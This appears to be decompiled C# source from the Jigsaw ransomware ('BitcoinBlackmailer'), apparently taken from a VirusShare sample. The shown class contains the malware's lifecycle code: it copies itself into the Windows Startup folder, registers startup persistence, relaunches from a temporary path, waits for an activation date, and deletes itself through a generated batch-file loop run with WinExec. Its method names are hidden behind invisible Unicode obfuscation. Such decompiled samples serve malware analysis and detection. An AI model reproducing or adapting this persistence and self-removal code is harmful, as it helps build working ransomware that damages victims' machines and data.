// Decompiled with JetBrains decompiler
// Type: Main.Tools.Hacking
// Assembly: BitcoinBlackmailer, Version=37.0.2.5583, Culture=neutral, PublicKeyToken=null
// MVID: 628485CE-1750-4702-9367-C5FFF8321F79
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\Win.Ransomware.Jigsaw-6866216-0-773295583998b76b4e24b562f85fa685577067614133db4a7df3d2a28cb4cc3a.exe

using Main.Properties;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Main.Tools
{
  internal static class Hacking
  {
    internal static void InitSoftware(Config.StartModeType startMode, string arg)
    {
      if (startMode == Config.StartModeType.Debug)
      {
        int num1 = (int) Hacking.\u206D⁭‬‏‏‪⁬⁭‫‭‭‫‍‪‫‌⁫⁫‫‍⁯‎⁫⁪⁭⁬⁫‌⁮⁪‬​⁮‪‌​⁯⁪‬⁪‮(Resources.StartModeDebug);
      }
      else if (arg != null)
      {
        if (startMode == Config.StartModeType.DeleteItself)
        {
          arg = Hacking.\u206E⁫⁬‎‌​‮​‍‪‏‍‫​‌‫‫‏‪‏‎‌​‌‬⁮⁫⁭‎​‪‏‎‮‌‌⁫⁮⁮‭‮(arg, "?", " ");
          if (Hacking.\u202A‭‪⁮‮‌⁬⁬‮‍‎⁯‬‍⁫‍​‪‬‮‌‏⁯‏‎⁬‌⁪‪‪​⁫⁫‫‌‭‪‍‌⁯‮(arg) && Hacking.\u206F​⁬‬⁬‬‫‪⁯⁪⁬‭‭​⁬⁪⁭‏⁫​‫⁪‎⁫⁯‫‌‫⁮⁯⁪‮‍⁬‬​‏⁫‪‌‮(arg))
          {
            int num2 = 0;
            bool flag;
            do
            {
              string str = Hacking.\u206D‏⁪‭‍​‭​⁮‮‪⁭⁫⁪‌‭‏‫‭‎‏‮‭‬‭‮⁪⁭⁭‫⁫‎‬⁭‪‌‬‌⁭‍‮(arg);
              string exeFolderPath = Hacking.\u202A⁭⁪‪‏‎‎‌‭‎‎‮‭⁭⁯‭‭‬‎‪‫‏‭‍‌​⁯‬‍⁭​⁫‫‬‭⁪⁯‫‫‌‮((object) Hacking.\u200C⁫‮⁪⁬⁫‪​⁭⁪‌‮⁫⁯‏⁪‎‌‎⁯‬‭⁭‫‍‭‫‪‫‮⁪‮‮‬‎⁯‬⁯‌‎‮(arg));
              // ISSUE: reference to a compiler-generated method
              // ISSUE: reference to a compiler-generated method
              // ISSUE: reference to a compiler-generated method
              flag = ((IEnumerable<Process>) Hacking.\u200F‪‎‌⁯‭⁪‏⁮⁪‪‏‎⁬‍‬‮⁮‎‍‬⁫‬‏⁫‌‎‍‮‬⁪‏⁯⁭‎‬⁫‬⁮‫‮(str)).FirstOrDefault<Process>((Func<Process, bool>) (p => Hacking.\u003C\u003Ec__DisplayClass0_0.\u202C‮‮⁬‬⁭⁮​‭‪⁮‎⁯⁫⁬‮​⁮​‫⁯‬⁬⁪​‍‬‌‭‬‌⁯‭⁫‏⁯⁮‬‬‫‮(Hacking.\u003C\u003Ec__DisplayClass0_0.\u200D⁪⁯‭‪‭⁮‌⁫⁯‎⁬​‎‮‭⁫⁫​‭⁯‫‏‬‌​‎‪‍‏⁮‫‍⁯⁯‪‫‭⁮‏‮(Hacking.\u003C\u003Ec__DisplayClass0_0.\u202A⁫⁮‪​‪⁭‏‪​⁭‬‎‭​‍⁯‎‎⁮‏​​​‫⁭‮‎⁮‬‪⁮‍⁪⁮⁭‌‮⁬‪‮(p)), exeFolderPath))) != null;
              Hacking.\u200D‬⁯⁮⁬⁯⁫‪‪⁫⁪‭​⁯⁭‮⁬⁪‬⁬‍⁮‏‍⁮⁯⁮⁬‌​‫‎‫‭‮⁫⁬‍⁬⁫‮(100);
              ++num2;
            }
            while (flag && num2 < 100);
            Hacking.\u200D‬⁯⁮⁬⁯⁫‪‪⁫⁪‭​⁯⁭‮⁬⁪‬⁬‍⁮‏‍⁮⁯⁮⁬‌​‫‎‫‭‮⁫⁬‍⁬⁫‮(300);
            if (!flag)
              Hacking.\u206F⁬‬‌⁫‏‮‬‮⁮⁬⁭‬‏⁬‏⁯‍‭​‏‬‏‏⁭‬‫⁯‫⁭‎⁮⁫⁪⁪‭⁭⁭‍⁯‮(arg);
          }
        }
        if (startMode == Config.StartModeType.ErrorMessage)
        {
          int num3 = (int) Hacking.\u202D‏⁯‎⁬​‪‮‎⁪​‭⁫‌⁫‭‮⁮⁪‮⁬‬‫‏⁭​⁪‭⁭⁯⁭‬‌⁮‭⁭⁯‮​‌‮(Config.ErrorMessage, Config.ErrorTitle, MessageBoxButtons.OK, MessageBoxIcon.Hand);
        }
        if (!Config.OnlyRunAfterSysRestart)
          return;
        Hacking.\u202E⁯‫⁯‪⁭​‏‬⁮⁬​⁫⁪⁭‭⁬⁬‏⁮⁬⁮‫‪‭‮‭‬⁪⁯⁮⁭⁪⁮⁯⁫⁬‫‫⁮‮(0);
      }
      else
      {
        string tempExePath = Config.TempExePath;
        if (Config.FinalExeRelativePath != null)
        {
          string str = Hacking.\u202C‍‏⁯‪⁬‏⁭‬‍‪‮⁬⁯⁭‌⁭⁬⁪‏‮⁫⁫‌‭‍⁮‎⁭‭‍​‭⁪‍‮‫⁪‬⁯‮(Hacking.\u202D‏‎⁯⁫⁮‬⁬‬‏‍‎‮‏⁮⁮‮⁫⁭‏⁪‎⁮⁮‬‬‬​‍‮‬‬‭‎⁫‫⁮‎‭⁫‮(Environment.SpecialFolder.Startup), Hacking.\u202C‭⁭‌‎⁯‮​‍‮⁫⁮‎‮​​‭‬‌‪⁮‬⁫‪⁬‭‎‮‬‎‌‮⁪‪‎‭⁪‍‎‪‮(Config.FinalExeRelativePath));
          Main.Tools.Windows.SetStartup(Config.StartupMethod);
          if (Hacking.\u206D‬‍⁪⁫‪‫‏⁪‪‭⁫‌‪‏‬⁬⁪‮⁪‏‏‫⁮​‫⁭‮⁪⁭⁪‎⁯⁭⁬‬‫‏‌⁫‮(Hacking.\u202A⁮⁬⁪⁯‌⁭⁯⁬‬⁪‮⁫‫‬⁮⁯⁮‫‮⁬⁯⁯⁪⁭​‍‌‪​‭⁫‮‫​‫‏‪‌⁮‮(), Config.FinalExePath) || Hacking.\u206D‬‍⁪⁫‪‫‏⁪‪‭⁫‌‪‏‬⁬⁪‮⁪‏‏‫⁮​‫⁭‮⁪⁭⁪‎⁯⁭⁬‬‫‏‌⁫‮(Hacking.\u202A⁮⁬⁪⁯‌⁭⁯⁬‬⁪‮⁫‫‬⁮⁯⁮‫‮⁬⁯⁯⁪⁭​‍‌‪​‭⁫‮‫​‫‏‪‌⁮‮(), str))
            return;
        }
        if (Hacking.ExeSmartCopy(Config.FinalExePath, true))
          Hacking.ExeSmartCopy(tempExePath, true);
        string str1 = Hacking.\u206E⁫⁬‎‌​‮​‍‪‏‍‫​‌‫‫‏‪‏‎‌​‌‬⁮⁫⁭‎​‪‏‎‮‌‌⁫⁮⁮‭‮(Hacking.\u202A⁮⁬⁪⁯‌⁭⁯⁬‬⁪‮⁫‫‬⁮⁯⁮‫‮⁬⁯⁯⁪⁭​‍‌‪​‭⁫‮‫​‫‏‪‌⁮‮(), " ", "?");
        Hacking.\u206C‌‬⁭⁯⁭​‎⁫⁭‏‌​‍‪‫⁪⁯​⁫‎⁮⁬‪⁬‎⁯⁪‎‍‎⁮⁭⁮‬⁯⁫⁬⁫‫‮(tempExePath, str1);
        Hacking.\u202E⁯‫⁯‪⁭​‏‬⁮⁬​⁫⁪⁭‭⁬⁬‏⁮⁬⁮‫‪‭‮‭‬⁪⁯⁮⁭⁪⁮⁯⁫⁬‫‫⁮‮(0);
      }
    }

    internal static bool ExeSmartCopy(string targetExePath, bool overwrite)
    {
      if (Hacking.\u206D‬‍⁪⁫‪‫‏⁪‪‭⁫‌‪‏‬⁬⁪‮⁪‏‏‫⁮​‫⁭‮⁪⁭⁪‎⁯⁭⁬‬‫‏‌⁫‮(Hacking.\u202A⁮⁬⁪⁯‌⁭⁯⁬‬⁪‮⁫‫‬⁮⁯⁮‫‮⁬⁯⁯⁪⁭​‍‌‪​‭⁫‮‫​‫‏‪‌⁮‮(), targetExePath))
        return false;
      Hacking.\u200F​‪‌‍​⁫⁬‎‏‌‭‎⁮‭⁪‮‫⁮‬⁬⁪⁯⁮‫‮‮‪‌‍⁫⁭⁪‬‎‫‫⁪‪‮(Hacking.\u202A⁭⁪‪‏‎‎‌‭‎‎‮‭⁭⁯‭‭‬‎‪‫‏‭‍‌​⁯‬‍⁭​⁫‫‬‭⁪⁯‫‫‌‮((object) Hacking.\u200C⁫‮⁪⁬⁫‪​⁭⁪‌‮⁫⁯‏⁪‎‌‎⁯‬‭⁭‫‍‭‫‪‫‮⁪‮‮‬‎⁯‬⁯‌‎‮(targetExePath)));
      Hacking.\u202A‭⁬⁯‏⁭‌‪‪‌​‍⁫‬‫⁯‮‫⁯‬⁯‬‫⁪⁪‭⁪⁬‮⁯‫‍‪⁯‫⁮‎‏​‌‮(Hacking.\u202A⁮⁬⁪⁯‌⁭⁯⁬‬⁪‮⁫‫‬⁮⁯⁮‫‮⁬⁯⁯⁪⁭​‍‌‪​‭⁫‮‫​‫‏‪‌⁮‮(), targetExePath, overwrite);
      return true;
    }

    internal static bool ShouldActivate() => DateTime.Now > Config.ActiveAfterDateTime;

    internal static void RemoveItself()
    {
      if (Config.StartMode == Config.StartModeType.Debug)
        Hacking.\u202E⁯‫⁯‪⁭​‏‬⁮⁬​⁫⁪⁭‭⁬⁬‏⁮⁬⁮‫‪‭‮‭‬⁪⁯⁮⁭⁪⁮⁯⁫⁬‫‫⁮‮(0);
      try
      {
        Main.Tools.Windows.RemoveStartupRegistry(Config.FinalExePath);
        foreach (string str in new HashSet<string>()
        {
          Hacking.\u206F‭⁪⁪‬‮‏⁮⁭‭‬⁬⁮‌‍‭‎‎‪⁬​‪‬‬‮‎‮‏⁫⁪⁪‍​‌‮⁬‍‪⁭‭‮(Config.FinalExePath),
          Hacking.\u206F‭⁪⁪‬‮‏⁮⁭‭‬⁬⁮‌‍‭‎‎‪⁬​‪‬‬‮‎‮‏⁫⁪⁪‍​‌‮⁬‍‪⁭‭‮(Config.TempExePath),
          Config.WorkFolderPath
        })
        {
          try
          {
            if (Hacking.\u206C⁬⁪⁮‬⁫‌‭⁯‪‌‏‬‍‪‎‮⁯⁮‪⁮‍⁬‮‮‏‌‬‏‏⁭⁭⁫‌‍‍⁯⁬‫⁫‮(str))
              Hacking.\u200D‍‏⁬⁭⁬‏⁯‮⁮⁭‪‫⁭‬⁭⁮​⁭‎‎⁫⁮‎‏‎‎⁭​‌‬‎‫‮​​‬‮‌⁯‮(str, true);
          }
          catch (Exception ex)
          {
          }
        }
        string lpCmdLine = Hacking.\u202E⁬⁬‌‏‍‎⁫‫⁭⁮‌⁯⁮⁬⁫‏‪‭⁮‬⁮‌‭⁭‏‍‌‬‏⁫⁬⁭‬⁪‬⁪⁯‭⁯‮(Hacking.\u206F‭⁪⁪‬‮‏⁮⁭‭‬⁬⁮‌‍‭‎‎‪⁬​‪‬‬‮‎‮‏⁫⁪⁪‍​‌‮⁬‍‪⁭‭‮(Hacking.\u202A⁮⁬⁪⁯‌⁭⁯⁬‬⁪‮⁫‫‬⁮⁯⁮‫‮⁬⁯⁯⁪⁭​‍‌‪​‭⁫‮‫​‫‏‪‌⁮‮()), "\\DeleteItself.bat");
        StreamWriter streamWriter = Hacking.\u206E‬‎⁪‍‭⁯⁯‍‮⁬‌‍‮‭‌⁬‮‍‪‎‏​‫‭‬‭‍⁬‏⁮‪‫‮‫‏​‮‭‌‮(lpCmdLine, false, Hacking.\u206B‪​‪‎‪⁭⁮⁫⁭‫‫‬⁮⁮⁯‍⁪⁯‏‫⁫⁬‏​‍⁯‬‫⁫⁮‌‬‭‫⁫⁮⁮‌‭‮());
        try
        {
          Hacking.\u200C⁭‫‭‌⁯‎⁯‌⁪⁬‬​⁯⁬‫‬⁪‪⁮‍‭⁬​‭‌⁫⁬‫‫​‮‫‍‬⁪‌‪‎‌‮((TextWriter) streamWriter, ":del\r\n del \"{0}\"\r\nif exist \"{0}\" goto del\r\ndel %0\r\n", (object) Hacking.\u202A⁮⁬⁪⁯‌⁭⁯⁬‬⁪‮⁫‫‬⁮⁯⁮‫‮⁬⁯⁯⁪⁭​‍‌‪​‭⁫‮‫​‫‏‪‌⁮‮());
        }
        finally
        {
          if (streamWriter != null)
            Hacking.\u202B⁬‬⁯⁯⁮‌‏⁫⁭⁫⁭⁭⁯‮⁭‭‌‍‬‮⁪‭‍‪⁬⁪⁮‏‫​⁫⁪‏‮⁬⁮‭⁫‫‮((IDisposable) streamWriter);
        }
        int num = (int) Hacking.WinExec(lpCmdLine, 0U);
      }
      catch
      {
      }
      finally
      {
        try
        {
          Hacking.\u202E⁯‫⁯‪⁭​‏‬⁮⁬​⁫⁪⁭‭⁬⁬‏⁮⁬⁮‫‪‭‮‭‬⁪⁯⁮⁭⁪⁮⁯⁫⁬‫‫⁮‮(0);
        }
        catch
        {
          Hacking.\u206E⁪‏‫‌⁬‍‪‌⁯​⁬⁬‭‎‪⁯‌‭‎⁬⁮‬⁯⁬‎‮‍‭⁯‍‬‏⁮‫⁫⁭‮⁬⁬‮();
        }
      }
    }

    [DllImport("kernel32.dll")]
    public static extern uint WinExec(string lpCmdLine, uint uCmdShow);

    static DialogResult \u206D⁭‬‏‏‪⁬⁭‫‭‭‫‍‪‫‌⁫⁫‫‍⁯‎⁫⁪⁭⁬⁫‌⁮⁪‬​⁮‪‌​⁯⁪‬⁪‮([In] string obj0) => MessageBox.Show(obj0);

    static string \u206E⁫⁬‎‌​‮​‍‪‏‍‫​‌‫‫‏‪‏‎‌​‌‬⁮⁫⁭‎​‪‏‎‮‌‌⁫⁮⁮‭‮(
      [In] string obj0,
      [In] string obj1,
      [In] string obj2)
    {
      return obj0.Replace(obj1, obj2);
    }

    static bool \u202A‭‪⁮‮‌⁬⁬‮‍‎⁯‬‍⁫‍​‪‬‮‌‏⁯‏‎⁬‌⁪‪‪​⁫⁫‫‌‭‪‍‌⁯‮([In] string obj0) => Path.IsPathRooted(obj0);

    static bool \u206F​⁬‬⁬‬‫‪⁯⁪⁬‭‭​⁬⁪⁭‏⁫​‫⁪‎⁫⁯‫‌‫⁮⁯⁪‮‍⁬‬​‏⁫‪‌‮([In] string obj0) => File.Exists(obj0);

    static string \u206D‏⁪‭‍​‭​⁮‮‪⁭⁫⁪‌‭‏‫‭‎‏‮‭‬‭‮⁪⁭⁭‫⁫‎‬⁭‪‌‬‌⁭‍‮([In] string obj0) => Path.GetFileNameWithoutExtension(obj0);

    static DirectoryInfo \u200C⁫‮⁪⁬⁫‪​⁭⁪‌‮⁫⁯‏⁪‎‌‎⁯‬‭⁭‫‍‭‫‪‫‮⁪‮‮‬‎⁯‬⁯‌‎‮([In] string obj0) => Directory.GetParent(obj0);

    static string \u202A⁭⁪‪‏‎‎‌‭‎‎‮‭⁭⁯‭‭‬‎‪‫‏‭‍‌​⁯‬‍⁭​⁫‫‬‭⁪⁯‫‫‌‮([In] object obj0) => obj0.ToString();

    static Process[] \u200F‪‎‌⁯‭⁪‏⁮⁪‪‏‎⁬‍‬‮⁮‎‍‬⁫‬‏⁫‌‎‍‮‬⁪‏⁯⁭‎‬⁫‬⁮‫‮([In] string obj0) => Process.GetProcessesByName(obj0);

    static void \u200D‬⁯⁮⁬⁯⁫‪‪⁫⁪‭​⁯⁭‮⁬⁪‬⁬‍⁮‏‍⁮⁯⁮⁬‌​‫‎‫‭‮⁫⁬‍⁬⁫‮([In] int obj0) => Thread.Sleep(obj0);

    static void \u206F⁬‬‌⁫‏‮‬‮⁮⁬⁭‬‏⁬‏⁯‍‭​‏‬‏‏⁭‬‫⁯‫⁭‎⁮⁫⁪⁪‭⁭⁭‍⁯‮([In] string obj0) => File.Delete(obj0);

    static DialogResult \u202D‏⁯‎⁬​‪‮‎⁪​‭⁫‌⁫‭‮⁮⁪‮⁬‬‫‏⁭​⁪‭⁭⁯⁭‬‌⁮‭⁭⁯‮​‌‮(
      [In] string obj0,
      [In] string obj1,
      [In] MessageBoxButtons obj2,
      [In] MessageBoxIcon obj3)
    {
      return MessageBox.Show(obj0, obj1, obj2, obj3);
    }

    static void \u202E⁯‫⁯‪⁭​‏‬⁮⁬​⁫⁪⁭‭⁬⁬‏⁮⁬⁮‫‪‭‮‭‬⁪⁯⁮⁭⁪⁮⁯⁫⁬‫‫⁮‮([In] int obj0) => Environment.Exit(obj0);

    static string \u202D‏‎⁯⁫⁮‬⁬‬‏‍‎‮‏⁮⁮‮⁫⁭‏⁪‎⁮⁮‬‬‬​‍‮‬‬‭‎⁫‫⁮‎‭⁫‮([In] Environment.SpecialFolder obj0) => Environment.GetFolderPath(obj0);

    static string \u202C‭⁭‌‎⁯‮​‍‮⁫⁮‎‮​​‭‬‌‪⁮‬⁫‪⁬‭‎‮‬‎‌‮⁪‪‎‭⁪‍‎‪‮([In] string obj0) => Path.GetFileName(obj0);

    static string \u202C‍‏⁯‪⁬‏⁭‬‍‪‮⁬⁯⁭‌⁭⁬⁪‏‮⁫⁫‌‭‍⁮‎⁭‭‍​‭⁪‍‮‫⁪‬⁯‮([In] string obj0, [In] string obj1) => Path.Combine(obj0, obj1);

    static string \u202A⁮⁬⁪⁯‌⁭⁯⁬‬⁪‮⁫‫‬⁮⁯⁮‫‮⁬⁯⁯⁪⁭​‍‌‪​‭⁫‮‫​‫‏‪‌⁮‮() => Application.ExecutablePath;

    static bool \u206D‬‍⁪⁫‪‫‏⁪‪‭⁫‌‪‏‬⁬⁪‮⁪‏‏‫⁮​‫⁭‮⁪⁭⁪‎⁯⁭⁬‬‫‏‌⁫‮([In] string obj0, [In] string obj1) => obj0 == obj1;

    static Process \u206C‌‬⁭⁯⁭​‎⁫⁭‏‌​‍‪‫⁪⁯​⁫‎⁮⁬‪⁬‎⁯⁪‎‍‎⁮⁭⁮‬⁯⁫⁬⁫‫‮([In] string obj0, [In] string obj1) => Process.Start(obj0, obj1);

    static DirectoryInfo \u200F​‪‌‍​⁫⁬‎‏‌‭‎⁮‭⁪‮‫⁮‬⁬⁪⁯⁮‫‮‮‪‌‍⁫⁭⁪‬‎‫‫⁪‪‮([In] string obj0) => Directory.CreateDirectory(obj0);

    static void \u202A‭⁬⁯‏⁭‌‪‪‌​‍⁫‬‫⁯‮‫⁯‬⁯‬‫⁪⁪‭⁪⁬‮⁯‫‍‪⁯‫⁮‎‏​‌‮([In] string obj0, [In] string obj1, [In] bool obj2) => File.Copy(obj0, obj1, obj2);

    static string \u206F‭⁪⁪‬‮‏⁮⁭‭‬⁬⁮‌‍‭‎‎‪⁬​‪‬‬‮‎‮‏⁫⁪⁪‍​‌‮⁬‍‪⁭‭‮([In] string obj0) => Path.GetDirectoryName(obj0);

    static bool \u206C⁬⁪⁮‬⁫‌‭⁯‪‌‏‬‍‪‎‮⁯⁮‪⁮‍⁬‮‮‏‌‬‏‏⁭⁭⁫‌‍‍⁯⁬‫⁫‮([In] string obj0) => Directory.Exists(obj0);

    static void \u200D‍‏⁬⁭⁬‏⁯‮⁮⁭‪‫⁭‬⁭⁮​⁭‎‎⁫⁮‎‏‎‎⁭​‌‬‎‫‮​​‬‮‌⁯‮([In] string obj0, [In] bool obj1) => Directory.Delete(obj0, obj1);

    static string \u202E⁬⁬‌‏‍‎⁫‫⁭⁮‌⁯⁮⁬⁫‏‪‭⁮‬⁮‌‭⁭‏‍‌‬‏⁫⁬⁭‬⁪‬⁪⁯‭⁯‮([In] string obj0, [In] string obj1) => obj0 + obj1;

    static Encoding \u206B‪​‪‎‪⁭⁮⁫⁭‫‫‬⁮⁮⁯‍⁪⁯‏‫⁫⁬‏​‍⁯‬‫⁫⁮‌‬‭‫⁫⁮⁮‌‭‮() => Encoding.Default;

    static StreamWriter \u206E‬‎⁪‍‭⁯⁯‍‮⁬‌‍‮‭‌⁬‮‍‪‎‏​‫‭‬‭‍⁬‏⁮‪‫‮‫‏​‮‭‌‮(
      [In] string obj0,
      [In] bool obj1,
      [In] Encoding obj2)
    {
      return new StreamWriter(obj0, obj1, obj2);
    }

    static void \u200C⁭‫‭‌⁯‎⁯‌⁪⁬‬​⁯⁬‫‬⁪‪⁮‍‭⁬​‭‌⁫⁬‫‫​‮‫‍‬⁪‌‪‎‌‮(
      [In] TextWriter obj0,
      [In] string obj1,
      [In] object obj2)
    {
      obj0.Write(obj1, obj2);
    }

    static void \u202B⁬‬⁯⁯⁮‌‏⁫⁭⁫⁭⁭⁯‮⁭‭‌‍‬‮⁪‭‍‪⁬⁪⁮‏‫​⁫⁪‏‮⁬⁮‭⁫‫‮([In] IDisposable obj0) => obj0.Dispose();

    static void \u206E⁪‏‫‌⁬‍‪‌⁯​⁬⁬‭‎‪⁯‌‭‎⁬⁮‬⁯⁬‎‮‍‭⁯‍‬‏⁮‫⁫⁭‮⁬⁬‮() => Application.Exit();
  }
}
